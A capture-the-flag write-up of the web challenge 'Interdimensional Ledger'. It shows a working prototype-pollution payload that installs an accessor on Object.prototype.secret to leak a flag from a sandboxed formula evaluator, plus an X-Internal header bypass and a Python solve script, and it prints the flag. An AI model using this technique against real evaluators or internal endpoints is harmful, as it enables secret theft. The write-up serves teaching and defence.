# Interdimensional Ledger

**Category:** Web  ·  **Flag:** `ASIS{N0w_Th4t_Wa$nT_HaRd!}`

## Challenge Description

A small online spreadsheet (a Rick-and-Morty "Interdimensional Ledger", running
on Bun). Plain text stays text; anything beginning with `=` is evaluated as a
server-side formula. The sheet is posted to `/api/sheet` and evaluated results
come back per cell.

## Initial Analysis

```http
POST /api/sheet   {"cells":{"A1":"=1+1"}}   ->   {"out":{"A1":"2"}}
```

The page carries a loud hint:

```js
// TODO: Remind me to protect the 'secret' var properly
```

There is also a privileged endpoint:

```http
GET /api/flag
```

Without a header it returns `{"error":"internal callers only"}`. Adding
`X-Internal: 1` gets past the check but only yields the **decoy**
`flag{just_a_decoy_keep_digging}`. That endpoint is a trigger + hint, not the
answer.

Recovered evaluator behavior (see `NOTES.md` / the app in `index.html`):

- Formula scope owns `cells`, `user`, `shared`, and `secret`.
- `secret` is an empty string in ordinary renders; a **privileged** render uses
  the real flag as `secret`.
- `shared` is an array that persists in the worker realm tied to the `sid` cookie.
- Member access is wrapped so methods stay bound to their receiver
  (so `shared.push` keeps its `this`).
- `Function.prototype.constructor` is deliberately replaced with `undefined`,
  killing the standard `constructor.constructor("return process")()` escape: a deliberate RCE rabbit hole.

The context is built with a plain assignment loop:

```js
function extend(dst, src){ for (const k of Object.keys(src)) dst[k] = src[k]; return dst; }
const ctx = extend({}, { cells, user:"u", shared, secret:"" });
```

## Vulnerability / Core Concept

**Prototype pollution via an accessor.** Since `dst` is a fresh empty object,
`dst["secret"] = src["secret"]` will invoke an *inherited* setter if one lives
on `Object.prototype.secret`. RCE is unnecessary: we just need one value.

Install a setter whose side effect copies the assigned value into the
persistent `shared` array. The next time a **privileged** context is built and
its real `secret` is assigned, our setter captures the flag. Then an ordinary
formula prints `shared`.

The formula language exposes `Object` as `constructor` and `Object.prototype`
as `__proto__`, and allows object literals with function-valued properties, so
`Object.defineProperty(Object.prototype, "secret", {set: shared.push})` is
expressible in one formula.

## Exploitation

All steps must ride the **same `sid` cookie** (single `requests.Session`): the polluted realm and `shared` array are per-session. See `solve.py`.

```python
# 1. Install Object.prototype.secret as a setter -> shared.push
install = ('=constructor.defineProperty(__proto__,"secret",'
           '{configurable:true,set:shared.push})')
s.post(BASE_URL + "/api/sheet", json={"cells": {"A1": install}})

# 2. Trigger the privileged path in the SAME session (visible response is the
#    decoy, but building its context assigns the real secret -> our setter).
s.get(BASE_URL + "/api/flag", headers={"X-Internal": "1"})

# 3. Render the persistent shared array.
r = s.post(BASE_URL + "/api/sheet", json={"cells": {"A1": '=shared.join("|")'}})
print(r.json()["out"]["A1"])   # |"ASIS{N0w_Th4t_Wa$nT_HaRd!}"|
```

The quoted middle entry of the `|`-joined output is the flag; the empty entries
come from ordinary renders assigning `secret: ""`.

## Flag

`ASIS{N0w_Th4t_Wa$nT_HaRd!}`

## Key Takeaways

- Don't expose reflective primitives (`Object.defineProperty`, `Object.prototype`)
  to untrusted formulas; build contexts with `Object.create(null)` and
  `defineProperty(value:...)` instead of prototype-sensitive assignment.
- Prototype pollution isn't only about storing values: installing an
  **accessor** turns a later assignment into a data-exfil primitive.
- Blocking one RCE gadget (`Function.prototype.constructor`) is not a sandbox.
  The real fix: the process evaluating hostile formulas should never receive
  the flag at all.
- The decoy `flag{just_a_decoy_keep_digging}` was a trigger, not the prize.
